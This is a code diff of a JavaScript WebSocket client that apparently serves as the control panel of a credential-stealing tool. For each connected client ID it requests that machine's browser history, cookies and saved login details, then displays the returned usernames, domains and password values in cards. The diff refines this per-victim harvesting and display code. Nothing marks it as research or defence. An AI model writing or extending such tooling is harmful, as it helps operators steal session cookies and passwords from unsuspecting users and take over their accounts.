@@ -27,18 +27,12 @@ ws.onclose = function(){
 };
 
 ws.onopen = function(event){
-    var jsonPackage ={type:'getList'};
+    var jsonPackage ={type:'getList', id:'0'};
     ws.send(JSON.stringify(jsonPackage));
     console.log("Request sent");
-    var jsonPackage ={type:'getClients'};
+    var jsonPackage ={type:'getClients', id:'0'};
     ws.send(JSON.stringify(jsonPackage));
     console.log("Request sent");
-    var jsonPackage ={type:'getHistory'};
-    ws.send(JSON.stringify(jsonPackage));
-    var jsonPackage = {type:'getCookies'};
-    ws.send(JSON.stringify(jsonPackage));
-    var jsonPackage = {type:'getLoginInfo'};
-    ws.send(JSON.stringify(jsonPackage));
 }
 
 ws.onmessage = function(e){
@@ -66,14 +60,20 @@ ws.onmessage = function(e){
             ids = object.ids;
             var statuses = object.status;
             for (i = 0; i < ids.length; i++){
-                makeCard(ids[i],statuses[i])
+                makeCard(ids[i],statuses[i]);
+                var jsonPackage ={type:'getHistory', id:'0', targetID:ids[i]};
+                ws.send(JSON.stringify(jsonPackage));
+                var jsonPackage = {type:'getCookies', id:'0', targetID:ids[i]};
+                ws.send(JSON.stringify(jsonPackage));
+                var jsonPackage = {type:'getLoginInfo', id:'0', targetID:ids[i]};
+                ws.send(JSON.stringify(jsonPackage));
             }
             break;
         case 'idHistory':
             fillHistory(object.targetID, object.historyArray);
             break;
         case 'cookieID':
-            fillCookies(object.targetID, object.name[i], object.domain[i], object.value[i]);
+            fillCookies(object.targetID, object.name, object.domain, object.value);
             break;
         case 'userInfo':
             fillLogins(object.targetID,object.domain,object.username,object.value);
